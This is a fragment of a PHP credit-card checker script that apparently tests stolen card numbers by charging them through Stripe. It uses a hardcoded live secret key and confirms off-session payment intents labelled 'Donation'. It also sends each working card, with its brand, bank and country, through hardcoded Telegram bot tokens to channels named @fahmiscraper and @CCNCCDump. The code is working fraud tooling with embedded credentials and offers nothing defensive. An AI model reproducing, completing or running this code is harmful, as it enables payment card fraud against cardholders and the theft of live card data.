...
if(!$sk){
  #$sk = "";
  $sks = array(
    "sk_live_jtOcyYhgehbByQSICmwt9rwB",
);
...
$forwardcharged="https://api.telegram.org/bot6366773556:AAEq6i4JDHVhGOD3W9__qI8dSg3Pl_kXKT4/sendMessage?chat_id=@fahmiscraper&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ 𝙐𝙡𝙩𝙧𝙖 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 | *$brand* *$category* *$type* |%0A*$bank* | *$country*";

$forwardcvv="https://api.telegram.org/bot6366773556:AAEq6i4JDHVhGOD3W9__qI8dSg3Pl_kXKT4/sendMessage?chat_id=@fahmiscraper&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ 𝙐𝙡𝙩𝙧𝙖 𝘾𝙑𝙑 𝙇𝙄𝙑𝙀 | *$brand* *$category* *$type* |%0A*$bank* | *$country*";

$forwardccn="https://api.telegram.org/bot6366773556:AAEq6i4JDHVhGOD3W9__qI8dSg3Pl_kXKT4/sendMessage?chat_id=@CCNCCDump&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ 𝙐𝙡𝙩𝙧𝙖 𝘾𝘾𝙉 𝙇𝙄𝙑𝙀 | *$brand* *$category* *$type* |%0A*$bank* | *$country*";
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=𝙐𝙡𝙩𝙧𝙖 Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
...
if(strpos($result2, '"seller_message": "Payment complete."' )) {
    ...
    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ 𝙐𝙡𝙩𝙧𝙖  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
}
